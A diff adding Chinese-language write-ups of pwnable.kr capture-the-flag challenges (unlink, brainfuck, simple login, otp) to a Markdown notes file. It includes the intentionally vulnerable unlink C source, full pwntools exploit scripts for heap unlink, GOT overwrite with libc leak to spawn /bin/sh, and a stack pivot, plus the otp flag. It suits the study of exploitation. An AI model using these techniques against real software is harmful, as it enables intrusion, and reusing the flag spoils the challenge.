@@ -384,8 +384,298 @@ print io.interactive()
 ## unlink
 
 ```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+typedef struct tagOBJ{
+	struct tagOBJ* fd;
+	struct tagOBJ* bk;
+	char buf[8];
+}OBJ;
+
+void shell(){
+	system("/bin/sh");
+}
+
+void unlink(OBJ* P){
+	OBJ* BK;
+	OBJ* FD;
+	BK=P->bk;
+	FD=P->fd;
+	FD->bk=BK;
+	BK->fd=FD;
+}
+int main(int argc, char* argv[]){
+	malloc(1024);
+	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
+	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
+	OBJ* C = (OBJ*)malloc(sizeof(OBJ));
+
+	// double linked list: A <-> B <-> C
+	A->fd = B;
+	B->bk = A;
+	B->fd = C;
+	C->bk = B;
+
+	printf("here is stack address leak: %p\n", &A);
+	printf("here is heap address leak: %p\n", A);
+	printf("now that you have leaks, get shell!\n");
+	// heap overflow!
+	gets(A->buf);
+
+	// exploit this unlink!
+	unlink(B);
+	return 0;
+}
+```
+
+gets(A->buf) 很明显存在堆溢出，所以可以任意地址写，覆盖返回main函数地址为shell地址。
 
 ```
+mov     ecx, [ebp+var_4]
+leave
+lea     esp, [ecx-4]
+retn
+```
+
+从汇编我们可以看到，只需要如下几个步骤即可:
+
+```
+esp = heap_A_address + 8
+=>
+ecx - 4 = heap_A_address + 8
+=>
+ecx = heap_A_address + 12
+=>
+[ebp - 4] = heap_A_address + 12
+=>
+[stack_A_address + 16] = heap_A_address + 12
+```
+
+同时，我们知道:
+
+```
+A: stack_A_address = &A = ebp - 0x14
+B: stack_B_address = &B = ebp - 0xc
+C: stack_C_address = &C = ebp - 0x10
+```
+
+任意地址写代码如下:
+
+```
+FD->bk = BK;
+BK->fd = FD;
+```
+
+相应的有两种方法:
+
+方法一:
+
+FD->bk = BK,则payload 如下:
+
+```
+fd: stack_A_address + 12
+bk: heap_A_address + 12
+```
+
+方法二:
+
+BK->fd = FD,则payload如下:
+
+```
+fd: heap_A_address + 12
+bk: stack_A_address + 16
+```
+
+所以payload如下:
+
+```
+from pwn import *
+
+p = process("./unlink")
+p.recvuntil(": ")
+stack_A_address = int(p.recvn(10), 16)
+print "stack_address: ", hex(stack_A_address)
+p.recvuntil(": ")
+heap_A_address = int(p.recvn(10), 16)
+print "heap_address: ", hex(heap_A_address)
+p.recvuntil("shell!")
+
+elf = ELF("./unlink")
+print "shell_address: " , hex(elf.symbols['shell'])
+
+# method 1
+#payload = p32(elf.symbols['shell']) + 'A' * 12 + p32(heap_A_address + 12) + p32(stack_A_address + 16)
+
+# method 2
+payload = p32(elf.symbols['shell']) + 'A' * 12 + p32(stack_A_address + 12) + p32(heap_A_address + 12)
+
+p.sendline(payload)
+p.interactive()
+```
+
+## brainfuck
+
+```
+int __cdecl do_brainfuck(char a1)
+{
+  int result; // eax
+  _BYTE *v2; // ebx
+
+  result = a1;
+  switch ( a1 )
+  {
+    case '+':
+      result = p;
+      ++*(_BYTE *)p;
+      break;
+    case ',':
+      v2 = (_BYTE *)p;
+      result = getchar();
+      *v2 = result;
+      break;
+    case '-':
+      result = p;
+      --*(_BYTE *)p;
+      break;
+    case '.':
+      result = putchar(*(char *)p);
+      break;
+    case '<':
+      result = p-- - 1;
+      break;
+    case '>':
+      result = p++ + 1;
+      break;
+    case '[':
+      result = puts("[ and ] not supported.");
+      break;
+    default:
+      return result;
+  }
+  return result;
+}
+```
+
+该函数存在任意地址写，范围不超过1024左右个字节，而p指针不远处就是got表，所以可以通过修改putchar的地址为"main"函数地址，修改"memset"地址为"gets"函数地址，修改"fgets"地址为"system"地址。
+
+需要注意的是，首先需要leak出libc的地址。
+
+```
+from pwn import *
+
+debug = 0
+
+#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
+libc = ELF("./bf_libc.so")
+context.log_level = "debug"
+
+if debug:
+    p = process("./bf")
+else:
+    p = remote("pwnable.kr", 9001)
+
+main_address = 0x8048671
+tape_address = 0x804A0A0
+putchar_got_address = 0x804A030
+p.recvuntil("[ ]\n")
+
+# the first "." is used to run the putchar function,and then the putchar_got_address will have the true putchar_address
+# get the libc_address
+payload = "." + "<" * (tape_address - putchar_got_address) + ".>.>.>."
+
+#modify putchar
+payload += "<<<,>,>,>,"
+# modify memset
+payload += "<<<<<<<,>,>,>,"
+# modify fgets
+payload += "<" * 31 + ",>,>,>,."
+p.sendline(payload)
+print payload
+putchar_address = u32(p.recvn(5)[1:])
+print "put_address: ", hex(putchar_address)
+libc_base = putchar_address - libc.symbols['putchar']
+print "libc_base: ",hex(libc_base)
+
+gets_address = libc_base + libc.symbols['gets']
+print "gets_address: ", hex(gets_address)
+system_address = libc_base + libc.symbols['system']
+print "system_address: ", hex(system_address)
+#attach(p)
+p.send(p32(main_address) + p32(gets_address))
+#attach(p)
+p.send(p32(system_address))
+p.recvuntil("[ ]")
+#attach(p)
+p.send("/bin/sh\x00")
+p.interactive()
+```
+
+## simple login
+
+```
+_BOOL4 __cdecl auth(int decode_length)
+{
+  char v2; // [esp+14h] [ebp-14h]
+  char *s2; // [esp+1Ch] [ebp-Ch]
+  int v4; // [esp+20h] [ebp-8h]
+
+  memcpy(&v4, &input, decode_length);           // 栈溢出,最多溢出4个字节,覆盖ebp
+  s2 = (char *)calc_md5(&v2, 12);
+  printf("hash : %s\n", s2);
+  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
+}
+```
+
+auth函数存在栈溢出，最多溢出4个字节，只能覆盖ebp，input在bss中。
+
+leave    => mov esb ebp; pop ebp;
+
+ret         => pop rip; jump rip;
+
+通过修改ebp指向bss段，这样esp将指向bss段，从而可以控制rip。
+
+```
+from pwn import *
+import base64
+
+debug = int(raw_input("is_debug:"))
+
+if debug:
+    p = process("./login")
+else:
+    p = remote("pwnable.kr", 9003)
+
+p.recvuntil(":")
+payload = "a" * 4 + p32(0x08049284) + p32(0x0811EB40)
+payload = base64.b64encode(payload)
+p.sendline(payload)
+
+p.interactive()
+```
+
+## otp
+
+通过ulimit限制了进程可以创建文件的最大值，只要限制为0，那么最后的密码一定为空，于是空密码通过，在写脚本时还需要注意的点就是把错误输出重定向到标准输出中。
+
+```
+ulimit -f 0
+```
+
+```
+import subprocess
+subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)	
+```
+
+flag: *Darn... I always forget to check the return value of fclose() :(*
+
+
+
+
+
+
+
+
 
 
 
